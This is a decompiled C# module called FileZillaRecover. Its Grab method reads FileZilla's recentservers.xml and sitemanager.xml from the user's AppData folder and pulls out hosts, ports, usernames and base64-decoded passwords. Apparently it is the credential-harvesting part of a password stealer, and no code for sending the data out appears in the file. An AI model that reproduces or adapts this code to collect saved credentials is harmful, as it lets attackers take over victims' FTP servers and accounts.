using System;
using System.IO;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000016 RID: 22
[StandardModule]
public sealed class FileZillaRecover
{
	// Token: 0x060000BA RID: 186 RVA: 0x0000E520 File Offset: 0x0000C720
	public static object Grab()
	{
		string text = string.Empty;
		if (File.Exists(Interaction.Environ("appdata") + "\\FileZilla\\recentservers.xml"))
		{
			text = "FileZilla Servers:\r\n";
			try
			{
				foreach (string text2 in File.ReadAllLines(Interaction.Environ("appdata") + "\\FileZilla\\recentservers.xml"))
				{
					bool flag = true;
					if (flag == text2.Contains("Host"))
					{
						text = text + "Host: " + FileZillaRecover.MidStr(text2, "<Host>", "</Host>") + ", ";
					}
					else if (flag == text2.Contains("Port"))
					{
						text = text + "Port: " + FileZillaRecover.MidStr(text2, "<Port>", "</Port>") + ", ";
					}
					else if (flag == text2.Contains("User"))
					{
						text = text + "User: " + FileZillaRecover.MidStr(text2, "<User>", "</User>") + ", ";
					}
					else if (flag == text2.Contains("base64\">"))
					{
						text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(Operators.ConcatenateObject("Pass: ", FileZillaRecover.Decryptor(FileZillaRecover.MidStr(text2, "base64\">", "</Pass>"))), "\r\n")));
					}
				}
			}
			catch (Exception ex)
			{
			}
		}
		if (File.Exists(Interaction.Environ("appdata") + "\\FileZilla\\sitemanager.xml"))
		{
			text = "FileZilla Sites:\r\n";
			try
			{
				foreach (string text3 in File.ReadAllLines(Interaction.Environ("appdata") + "\\FileZilla\\sitemanager.xml"))
				{
					bool flag2 = true;
					if (flag2 == text3.Contains("Host"))
					{
						text = text + "Host: " + FileZillaRecover.MidStr(text3, "<Host>", "</Host>") + ", ";
					}
					else if (flag2 == text3.Contains("Port"))
					{
						text = text + "Port: " + FileZillaRecover.MidStr(text3, "<Port>", "</Port>") + ", ";
					}
					else if (flag2 == text3.Contains("User"))
					{
						text = text + "User: " + FileZillaRecover.MidStr(text3, "<User>", "</User>") + ", ";
					}
					else if (flag2 == text3.Contains("base64\">"))
					{
						text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(Operators.ConcatenateObject("Pass: ", FileZillaRecover.Decryptor(FileZillaRecover.MidStr(text3, "base64\">", "</Pass>"))), "\r\n")));
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}
		if (Operators.CompareString(text, string.Empty, false) != 0)
		{
			text += "\r\n";
		}
		return text;
	}

	// Token: 0x060000BB RID: 187 RVA: 0x0000E81C File Offset: 0x0000CA1C
	public static string MidStr(string str, string d1, string d2)
	{
		if (str.IndexOf(d1) > -1 && str.IndexOf(d2) > -1)
		{
			return Strings.Mid(str, str.IndexOf(d1) + d1.Length + 1, str.IndexOf(d2) - str.IndexOf(d1) - d1.Length);
		}
		return string.Empty;
	}

	// Token: 0x060000BC RID: 188 RVA: 0x0000E870 File Offset: 0x0000CA70
	public static object Decryptor(string enc)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(enc));
	}
}
